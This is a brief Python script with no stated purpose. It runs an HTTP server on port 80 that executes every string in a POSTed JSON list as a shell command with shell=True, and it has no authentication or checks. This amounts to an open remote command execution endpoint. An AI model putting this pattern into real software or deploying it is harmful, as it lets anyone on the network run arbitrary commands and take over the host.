from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import json


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        post_data = self.rfile.read(int(self.headers['Content-Length']))
        commands = json.loads(post_data)
        results = []
        for command in commands:
            results.append(subprocess.Popen(command, shell=True).wait())
        self.send_response(200)


with HTTPServer(('', 80), Handler) as server:
    server.serve_forever()
